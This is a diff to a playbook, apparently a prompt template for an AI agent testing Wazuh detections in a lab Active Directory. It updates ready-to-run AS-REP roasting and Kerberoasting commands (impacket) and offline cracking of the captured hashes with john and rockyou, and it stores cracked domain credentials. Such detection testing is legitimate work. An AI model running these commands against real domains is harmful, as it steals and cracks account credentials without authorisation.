@@ -15,7 +15,7 @@ No credentials needed. Target accounts with Kerberos pre-authentication disabled
 
 ```bash
 # Use BadBlood user list from DC1
-GetNPUsers.py {{domain}}/ -dc-ip {{dc}} -no-pass \
+impacket-GetNPUsers {{domain}}/ -dc-ip {{dc}} -no-pass \
   -usersfile /tmp/all_users.txt \
   -outputfile {{logDir}}/asrep_hashes.txt 2>&1
 ```
@@ -33,27 +33,32 @@ Enumerate service accounts with SPNs and request TGS tickets.
 
 ```bash
 # If we have domain creds, use them
-GetUserSPNs.py {{domain}}/{{domain_user}}:{{domain_pass}} \
+impacket-GetUserSPNs {{domain}}/{{domain_user}}:{{domain_pass}} \
   -dc-ip {{dc}} \
   -outputfile {{logDir}}/kerberoast_hashes.txt \
   -request 2>&1
 
 # Without creds (anonymous, if allowed):
-GetUserSPNs.py {{domain}}/ -dc-ip {{dc}} -no-pass 2>&1
+impacket-GetUserSPNs {{domain}}/ -dc-ip {{dc}} -no-pass 2>&1
 ```
 
 Expected Wazuh rule: **100111** (level 12) -- Kerberoasting
 
 ## Attack 3: Hash Cracking (offline, no network events)
 
+CRITICAL: Do NOT use hashcat (no GPU on Kali VM). Use john only. ALWAYS pass --pot=/tmp/{hashtype}.pot.
+
 If hashes were captured:
 ```bash
-# Try common service account passwords
-hashcat -m 18200 {{logDir}}/asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
-  --force --quiet 2>&1 | head -20
+# Crack AS-REP hashes
+john {{logDir}}/asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --pot=/tmp/asrep.pot --format=krb5asrep
 
-hashcat -m 13100 {{logDir}}/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
-  --force --quiet 2>&1 | head -20
+# Crack Kerberoast hashes
+john {{logDir}}/kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --pot=/tmp/kerberoast.pot --format=krb5tgs
+
+# Show cracked results
+john --show --pot=/tmp/asrep.pot {{logDir}}/asrep_hashes.txt
+john --show --pot=/tmp/kerberoast.pot {{logDir}}/kerberoast_hashes.txt
 ```
 
 ## Output
@@ -82,6 +87,11 @@ Save cracked credentials (if any) to `{{logDir}}/cracked_creds.json`:
 - Hashes captured: yes/no
 ```
 If creds were cracked, also call `memory_append("session", "- Cracked domain creds: user:pass (method: kerberoast/asrep)")`.
+
+## Logging Protocol (MANDATORY)
+For every significant action, call `log_attack` TWICE:
+1. **Before execution**: result="skipped", details="STARTING: [what you're about to do]"
+2. **After result**: result="success"/"failed"/"blocked", details="RESULT: [what happened]"
 
 ## Rules
 - {{randomize}} == true means pick a random subset of targets each run
